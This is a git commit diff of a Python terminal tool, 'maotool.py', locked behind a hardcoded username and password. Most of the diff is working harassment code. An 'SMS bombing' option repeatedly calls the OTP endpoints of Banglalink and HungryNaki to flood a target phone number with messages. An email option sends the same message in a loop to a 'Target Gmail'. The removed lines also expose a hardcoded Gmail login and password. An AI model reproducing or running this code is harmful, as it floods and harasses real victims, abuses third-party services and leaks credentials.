5650747f81ddf7056671e37ea4e7a3e306e3280b
Ekramul Hassan <78520987+mao2116@users.noreply.github.com>
2021-04-16 15:19:59 +0600

    Update maotool.py

--- maotool.py
+++ maotool.py
@@ -1,15 +1,27 @@
+# -*- coding: utf-8 -*-
 #!/bin/python
 #Coder MD Ekramul Hassan 
 #GitHub : htpps://github.com/mao2116
 #FB ID:  https://www.facebook.com/ekramul.hassan.79827
+
+
+
+def logop (z):
+  for word in z + '\n':
+     sys.stdout.write(word)
+     sys.stdout.flush()
+     time.sleep(0.001)
+    
+
+
 import os
 try:
-  from termcolor import *
-  from pyfiglet import *
+  #from termcolor import *
+  #from pyfiglet import *
   from pytube import *
   import requests,time,os,sys,smtplib,pytube
 except:
-  print("Please Install all requerment .")
+  print("\033[0;32'40mPlease Install all requerment .")
   x = input("Your Requerment Install Please [y or n] :")
   
   if x== 'y' or 'Y':
@@ -18,14 +30,11 @@ except:
     os.system('apt install python')
     os.system('pip install requests ')
     os.system('pip install pytube')
-    os.system('pip install termcolor')
-    os.system('pip install pyfiglet')
-    #os.system('pip install')
-    #os.system('pip install ')
+    
   else:
     
-    print("if You Can't Install  Requerments Then Tool Not Run.")
-    print("Install Requerments") 
+    print("\033[0;32;40mif You Can't Install  Requerments Then Tool Not Run.")
+    print("\033[0;32;40mInstall Requerments") 
   exit()
 user = 'mao'#
 passwd = '2116'#
@@ -35,172 +44,295 @@ def word (z):
      sys.stdout.write(word)
      sys.stdout.flush()
      time.sleep(0.01)
+MTlogo ='''
+ \033[0;32;40m               ███╗░░░███╗████████╗
+  \033[0;31;40m              ████╗░████║╚══██╔══╝
+  \033[0;32;40m              ██╔████╔██║░░░██║░░░
+  \033[0;31;40m              ██║╚██╔╝██║░░░██║░░░
+  \033[0;34;40m              ██║░╚═╝░██║░░░██║░░░
+  \033[0;32;40m              ╚═╝░░░░░╚═╝░░░╚═╝░░░'''
+
 
 ###
-x3 = figlet_format("Ekramul", 'slant')
-x3 = colored(x3, 'cyan')
 
+word(MTlogo)
 
-x5 = figlet_format(":Mao Tool:", 'big')
-x5 = colored(x5, 'green')
 ###
 
 
-word(x5)
 
-word(x3)
+import os,sys,smtplib,time,requests
+
+
+t = time.localtime()
+current_time = time.strftime("%H:%M:%S", t)
+
+
+def word (z):
+  for word in z + '\n':
+     sys.stdout.write(word)
+     sys.stdout.flush()
+     time.sleep(0.01)
+
 while True:
-  us = input(colored("USERNAME: ", 'green'))
+  us = input("\033[0;32;40mUSERNAME: ")
+  
   if us == 'mao':
   
     while True:
-      psw = input(colored("PASSWORD: ", 'green'))
+      psw = input("\033[0;31;40mPASSWORD: ")
+    
       if psw == '2116':
         
         while True:
-          x = colored("[1.] Bangladesh :880", 'green')
-          x1 = colored("[2.] Youtube Video Download: ", 'green')
-          x2 = colored("[4.] For Cheack Updates And MoreTools: ", 'green')
-          x3 = figlet_format("Ekramul", 'slant')
-          x3 = colored(x3, 'cyan')
-          x5 = figlet_format(":Mao Tool:", 'big')
-          x7 = colored("[3.] Email Bombing :", 'green')
-          x6 =colored("[6.] To Exit", 'red')
-          xhlp = colored("[5.] For Report Any Kind Of Problem :", 'green')
-         # xv = figlet_format("V.1.0", 'small')
-          xv = colored("_____________V.1.0_____________", 'blue')
-          xbb = (colored("__________________________________________________", 'cyan'))
-          word(x3)
-          word(" ")
-          word(xbb)
-          word(" ")
-          word(xv)
-          word(" ")
-          word(xbb)
-          word(" ")
-         # word(x5)
-          word(x)
-          word(x1)
-          word(x7)
-          word(x2)
-          word(xhlp)
-          word(x6)
-          word(" ")
-          word(xbb)
-          word(" ")
-          time.sleep(2)
-          
-          
-          x4 = input(colored("Chose One Of Them :", 'green'))
-          x5 = colored(x5, 'green')
+          logoEH='''
+\033[0;0;0m   ██████████████████████████████████████
+   █▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒██▒▒▒▒▒▒█
+   █▒▒▄▀▄▀▄▀▄▀▄▀▒▒████████▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▄▀▒▒▒▒▒▒▒▒▒▒████████▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▄▀▒▒████████████████▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▄▀▒▒▒▒▒▒▒▒▒▒████████▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+   █▒▒▄▀▄▀▄▀▄▀▄▀▒▒████████▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
+   █▒▒▄▀▒▒▒▒▒▒▒▒▒▒████████▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
+   █▒▒▄▀▒▒████████████████▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
+   █▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█
+   ██████████████████████████████████████\n'''
+        
+             
+          chose = f'''
+\033[1;32;40m\033[3;32;40m^>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>^
+^                                          ^
+^          \033[1;34;40mTime:   {current_time}\033[3;32;40m                ^
+^                                          ^
+^  [ 1. ] SMS FUCKING :                    ^
+^  [ 2. ] Youtube Video Download :         ^
+^  [ 3. ] Email Spoofer :                  ^
+^  [ 4. ] List Of Fb Request You Send :    ^
+^  [ 5. ] To Check Updates And More Tool : ^  
+^  [ 6. ] To Report Any Kind Of Problem :  ^
+^  \033[1;31;40m[ 7. ] To Cancel : \033[3;32;40m                     ^
+^                                          ^
+^                 🅥.➊.➋                    ^
+^                                          ^
+^>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>^
+  '''
+
+          logop(logoEH)
+          word(chose)
+          inpo ='''🇮​​​​​🇳​​​​​🇵​​​​​🇺​​​​​🇹​​​​​ 🇴​​​​​🇵​​​​​🇹​​​​​🇮​​​​​🇴​​​​​🇳​​​​​'''
+          x4 = input('\033[1;32;40m'"[M.T.] "+inpo+" :")
           if x4 == '1':
-           num = input(colored("Fucking Number :", 'cyan'))
-           while True:
-             print(colored("Max 50!!", 'green'))
-             msg = input(colored("How Much You Want To Send :", 'green'))
-             mm = int(msg)
-             if (mm < 50):
-              for i in range(mm):
-               data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
-  
-               res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
-               #print(colored(res, 'green'))
-               mao = ('880'+num)
-               mao = colored(mao, 'green')
-               print(mao)
-               if res.status_code == 200:
-                 word(colored("Massege Sent SuccesFully", 'cyan'))
-               else:
-                word(colored("sorry", 'green'))
-              os.system("xdg-open https://www.facebook.com/ekramul.hassan.79827")
-              break
-             else:
-               word(colored("Max Massege 50 , Please Try Again", 'green'))
-
-
-
-           break
- 
-          elif x4 == '2':
             
+           
             while True:
-              gt = input(colored("Input Link \n >>",   'green'))
-              ut = requests.get(gt)
-              if ut.status_code == 200:
-                print(colored("Your Link Is Still Working.", 'green'))
-                print(colored("So We Good To Go :: ", 'green'))
-                vdp= input(colored("Save Path : \n >>", 'cyan'))
-                try:
-                   w = figlet_format("Wait", 'big')
-                   w = colored   (w, 'cyan')
-                   word(w)
-                   youtube = pytube.YouTube(gt)
-                   video = youtube.streams.first()
-                   video.download('/sdcard/'+vdp) 
-                   ds = figlet_format("Download Succed", 'small')
-                   ds = colored(ds, 'green')
-                   print(ds)
-                except:
-                   word(colored("Try Again", 'green'))
-      
+             sms = '''\033[0;32;40m
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+^  Using This Tool You Accept The Policy     ^
+^                                            ^
+^  Either Cancel This by Preesing [\033[1;31;40m Ctrl+C\033[0;32;40m ] ^
+^                                            ^
+^  ~~~You Can Use It For Only Bangladesh~~~  ^ 
+^                                            ^
+^ Coder : Ekramul Hassan                     ^
+^                                            ^
+^                     FB :                   ^
+https://www.facebook.com/ekramul.hassan.79827
+^                                            ^
+^                  Github                    ^
+          https://github.com/mao2116
+^  \033[0;31;40mBanglalink Operater Have A Little       \033[0;32;40m  ^
+^ \033[0;31;40m Bit Problem That Will Be Fix             \033[0;32;40m ^
+^ \033[0;31;40m As Soon As Possible!!!\033[0;32;40m                    ^
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+'''
+             word(sms)
+
+
+             num = input("\033[0;32;40mInput Target Number :880")
+             msg = input("\033[0;32;40mBombing Threat: ")
+             mm =int(msg)
+             if (mm < 100):
+               
+               if num.startswith("19") or num.startswith("14"):
+                 sent, nsent = 0, 0
+                 for i in range(1, mm +1):
+                   num1 =str("0"+num)
+                   r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": num1})
+                   if r.status_code == 200:
+                     word(f"\033[0;32;40m[ {i} ]Massege Sent !")
+                     sent += 1
+                     i += 1
+                     time.sleep(2)
+                     
+                   else:
+                     word(f"\033[0;31;40m[ {i} ]Massege Not Sent ")
+                     time.sleep(4)
+                     
+                     i+=1
+
+              
+               else:
+                 sent, nsent = 0, 0
+                 for i in range(1, mm +1):
+                   data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
+                   res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
+                   mao = ('880'+num)
+                   mao = (mao)
+       # print(mao)
+                   if res.status_code == 200:
+                     
+                     
+                     word('\033[0;32;40m'f"[ {i} ].Massege Sent SuccesFully!!")
+                     sent += 1
+                     i += 1
+                   else:
+                     word(f"[ {i} ]Massege Not send SuccesFully!!@#")
+                     i += 1
+       
+
+               #print(colored(res, 'green'))
+               break  
+               i += 1
+             else:
+               word("\033[0;32;40mMax Threat 100!@#")
+
+
+            totalhit  = i-1
+
+            nsent     = totalhit - sent
+ 
+            print(f"\033[0;32;40m[•] Total Hits : {totalhit}")
+
+            print(f"[✓] Total Sent : {sent}")
+
+            print(f"[×] Total Not Sent : {nsent}")
+            time.sleep(0.7)
+            os.system("xdg-open https://www.facebook.com/ekramul.hassan.79827")
+            break
+             
+            
+          elif x4 == '2':
+            while True:
+              
+              x = input("\033[0;32;40mEnter the URL of the video you want to download: \n>> ")
+              x1 = requests.get(x)
+              if x1.status_code == 200:
+                
+                
+                yt = YouTube(x)
+
+                print('\033[0;32;40m'"Select Download Format:")
+                print('\033[0;32;40m'"1: Video File Fith Audio (.mp4)")
+                print('\033[0;32;40m'"2: Audio Only (.mp3)")
+
+                media_type = input('\033[0;32;40m'">> ")
+
+                if media_type == "1":
+              
+                  vr ='''\033[0;32;40m
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+^                                    ^
+^  Select Video Type :               ^
+^  [1. ] HD :                        ^
+^  [2. ] Medium :                    ^
+^  [3. ] Low :                       ^
+^               🅥.➊.➋                ^
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+'''
+    
+    
+                  print(vr)
+                  ree = input('\033[0;32;40mInput Selection \n >>')
+                  if ree == '1':
+                    video = yt.streams.filter(res="720p", fps="30fps", progressive="True").first()
+        
+                  elif ree == '2':
+                    video = yt.streams.filter(res = "480p").first()
+                  elif ree == '3':
+                    video = yt.streams.first()
+
+                  elif media_type == "2":
+                    print("\033[1;31;40mWait For Final Update")
+                    exit()
+                  else:
+                    print("Invalid selection.")
+
+                print("Enter the destination (leave blank for current directory)")
+                destination = str(input(">> ")) or '.'
+
+                out_file = video.download(output_path = destination)
+
+                if media_type == "2":
+                 base, ext = os.path.splitext(out_file)
+                 new_file = base + '.mp3'
+                 os.rename(out_file, new_file)
+
+                print(yt.title + " has been successfully downloaded.")
                 break
               else:
-                print(colored("Your Link Is Not Working, Try another One", 'green'))
-      
-      
-    
-  
-
-
-            break
-          elif x4 == '4':
-            
-            x = figlet_format("Wait", 'big')
-            x = colored(x, 'green')
-            x1 = figlet_format("Cheaking Your Github,,,", 'small')
-            x1 = colored(x1, 'cyan')
-            word(x1)
-            word(x)
-            os.system('xdg-open https://github.com/mao2116/')
-            break
-          elif x4 == '3':
+                word("\033[1;31;40mYour Link Is Not Work Properly.")
+          elif x4 == "3":
             server = smtplib.SMTP('smtp.gmail.com', 587)
-
-            server.starttls()
-            server.login("hackermao2116@gmail.com","2116hackermao@")
-            mm = input(colored("How Much You Want To Send :", 'green'))
-            mm = int(mm)
-            gm = input(colored("Target Gmail :", 'green'))
-            sm = input(colored("What You Want To Send :", 'green'))
-            for i in range(mm):
+            word("\033[0;31;40mFor Eamil Bombing Use Your Email.")
+            mx = input("\033[0;32;40mYes[Y] or No[n]\n>>")
+            if  mx == 'Y' or mx == 'y':
+              mm = input("\033[0;32;40mInput Your Email :")
+              mp = input("\033[0;32;40mInput Your Email Password :") 
+              
               try:
-                server.sendmail("hackermao2116@gmail.com",gm,sm)
-                print("SuccesFully Email Sent!")
+                server.starttls()
+                server.login(mm, mp)
+                mn = int(input("\033[0;32;40mSending Limit :"))
+                gm = input("\033[0;32;40mYour Target Gmail :")
+                sm = input("\033[0;32;40mWhat You Want To Send :")
+                nsent, sent = 0, 0
+                for i in range(1, mn + 1):
+                  try:
+                    server.sendmail(mm,gm,sm)
+                    word(f"\033[0;32;40m[ {i} ]SuccesFully Send Email")
+                    sent+= 1 
+                    i+=1
+                  except:
+                    word("\033[1;31;40mFor Some Technical Issue The Email Not Send Report To:           Ekramu Hassan")
+                    
               except:
-                print("Try Again.")
-            break    
-          elif x4 == '5':
-            res = requests.get("https://www.facebook.com/ekramul.hassan.79827")
-            if res.status_code == 200 :
-              os.system("xdg-open https://www.facebook.com/ekramul.hassan.79827")
+                word("\033[0;31;40mCheack Your Email Please:@#")
+                exit()
+     
             else:
-              print(colored("Server Time Out.", 'red'))
+             word("\033[1;32;40mYou Have To Agree With This!!@#")
             break
-          elif x4 == '6':
+          elif x4 == "4":
+            word("\033[1;32;40mWait Please")
+            os.system("xdg-open https://m.facebook.com/friends/center/requests/outgoing/")
+            break
+          elif x4 == "5":
+            word("\033[1;32;40mThank You For Stay With  Us:")
+            res = requests.get("https://github.com/mao2116/")
+            if res.status_code==200:
+              word("\033[1;32;40mWe Good To Go")
+              print("\n")
+              os.system("xdg-open https://github.com/mao2116/")
+            break
+          elif x4 == "6":
+            word("\033[1;32;40m Inbox on This FB I'd")
+            os.system("xdg-open https://www.facebook.com/ekramul.hassan.79827")
+            break
+          elif x4 == "7":
+            word("\n")
             exit()
             
-          else:
-             word("Your Input Is Wrong")
-            
+            break
           
-        break
+          else:
+            word(f"\033[1;31;40m({x4})Is Out Of Range Or Wrong Input!!")
+        break    
       else:
+        word(f"\033[1;31;40mYour Input Password: ({psw}) Is Wrong")
         time.sleep(2)
-        x11 = colored(psw+" is Wrong password.#@", 'green')
-        word(x11)
     break
   else:
-    time.sleep(3)
-    x = colored(us+" is wrong user.#@", 'green')
-    word(x)
-
+    word(f"\033[1;3140mYour Input User: ({us}) Is Wrong")
+    time.sleep(2)
